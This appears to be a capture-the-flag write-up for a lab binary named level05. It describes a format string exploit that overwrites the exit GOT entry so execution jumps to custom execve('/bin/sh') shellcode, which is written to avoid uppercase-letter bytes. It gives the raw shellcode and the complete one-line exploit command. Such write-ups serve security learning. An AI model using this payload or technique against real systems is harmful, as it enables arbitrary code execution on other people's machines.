there is a format string vulnerability that could be exploited, we will override the exit function in the GOT to redirect to our shellcode

info function exit -> 0x08048370
x/i 0x08048370 -> 0x80497e0
real address of exit is 0x080497e0

0xffffdda8
address of our buffer (break just after printf, then "x/64x $esp")

because this address is too big when converted to decimal, we will divide it in two parts
0xffff -> 65535 in decimal
0xdda8 -> 56744 in decimal

we need to insert
65535 in 0x080497e2
56744 in 0x080497e0
for our shellcode to be executed

now, let's find the positions of our inputs on the stack to be able to override them
custom shellcode raw version -> \x90\x90\x90\x90\x90\x31\xc0\x31\xdb\xb0\x0b\x89\x1c\x24\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xcd\x80
size : 28 bytes, then the 2 parts of the exit address we want to override, size : 4 + 4 bytes
28 + 4 + 4 = 36, when we put dummy data we found that the 4 + 4 bytes part is accessible with the printf format string vulnerability on the 17 and 18 positions

%17$p is 0x080497e0
%18$p is 0x080497e2

last problem is, the program is converting this range of hexa characters : 41 to 5A
so we cannot use standard shellcode because they incluse those forbidden characters, we have to build a custom one

nasm -f elf32 shellcode.asm
ld -m elf_i386 shellcode.o
xxd -p shellcode.o

(python -c 'print "\x90\x90\x90\x90\x90\x31\xc0\x31\xdb\xb0\x0b\x89\x1c\x24\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xcd\x80" + "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%56708x%17$hn%8791x%18$hn"' ; cat) | env -i PWD="/home/users/level05" SHELL="/bin/bash" SHLVL=0 /home/users/level05/level05
